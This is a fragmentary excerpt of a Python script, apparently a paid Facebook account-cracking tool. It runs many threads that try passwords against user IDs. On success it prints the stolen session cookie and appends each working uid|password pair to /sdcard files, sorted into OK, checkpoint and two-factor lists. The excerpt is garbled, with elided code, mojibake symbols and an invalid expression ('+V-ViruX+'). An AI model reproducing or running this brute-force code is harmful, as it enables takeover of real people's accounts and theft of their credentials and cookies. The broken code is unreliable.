...
\033[1;32m-----------------------------------------------------
\033[38;5;195m[\033[38;5;46mâˆš\033[38;5;195m] ADMIN       : ᴀʀᴀғᴀᴛ ʙɪɴ ᴍᴀʜɪɴ
\033[38;5;195m[\033[38;5;46mâˆš\033[38;5;195m] FACEBOOK    : ᴀʀᴀғᴀᴛ ᴍᴀʜɪɴ
...
def Subscraption():
    ...
    if key1 in r1:
        ...
        os.system("clear")
        print(logo)
        print ("\033[38;5;196m[\033[1;32m+\033[38;5;196m]\033[1;32m Your Key : "+V-ViruX+key1)
        input("\033[38;5;196m[\033[1;32m+\033[38;5;196m]\033[1;32m\033[1;32m Enter To Send Key")
        time.sleep(3.5)
        tks = 'DEAR%20SIR%20I%20WANT%20TO%20BUY%20YOUR%20CRACK-FILE%20PAID%20TOOL%20%20%20%20%20%20%20%20%20%20%20'+V-ViruX+''+key1
...
def gmail():
    ...
    with ThreadPool(max_workers=30) as setu:
        ...
        print(f'\033[38;5;195m[\033[38;5;46mâˆš\033[38;5;195m] FILE SAVE   : \033[38;5;46m/SDCARD/ᴀʀᴀғᴀᴛ-ᴍᴀʜɪɴ-OK.txt')
        print(f'\033[38;5;195m[\033[38;5;46mâˆš\033[38;5;195m] FILE SAVE   : \033[38;5;196m/SDCARD/ᴀʀᴀғᴀᴛ-ᴍᴀʜɪɴ-CP.txt')
        print(tn)
        for guru in user:
...
def beeq(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r\033[38;5;195m[ᴀʀᴀғᴀᴛ-ᴍᴀʜɪɴ-XD\033[38;5;195m] %s|OK-\033[38;5;46m%s\r'%(loop,len(ok))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                uid = "1000"+coki1[0:11]
                print('\033[38;5;46m[ᴀʀᴀғᴀᴛ-ᴍᴀʜɪɴ-OK] '+uid+'|'+ps+' âˆš '+roksana(uid)+'\n\033[38;5;195m[\033[1;35mCOOKIE\033[38;5;195m] \033[1;34m'+coki+'')
                ok.append(uid)
                open('/sdcard/ᴀʀᴀғᴀᴛ-ᴍᴀʜɪɴ-X-OK.txt', 'a').write(uid+' | '+ps+'\n')
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                uid = "1000"+coki1[0:11]
                print(f'\033[38;5;206m[ᴀʀᴀғᴀᴛ-ᴍᴀʜɪɴ-CP] '+uid+'|'+ps+' âœ“ '+roksana(uid)+'\033[36;1m')
                open('/sdcard/ᴀʀᴀғᴀᴛ-ᴍᴀʜɪɴ-X-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cp.append(uid)
                break
                ...
                coki1 = coki.split("1000")[1]
                uid = "1000"+coki1[0:11]
                print(f'\033[38;5;208m[ᴀʀᴀғᴀᴛ-ᴍᴀʜɪɴ-2F] '+uid+'|'+ps+' âœ“ '+roksana(uid)+'\033[36;1m')
                open('/sdcard/ᴀʀᴀғᴀᴛ-ᴍᴀʜɪɴ-X-2F.txt', 'a').write(uid+' | '+ps+'\n')
                twf.append(uid)
                break
            else:
                continue
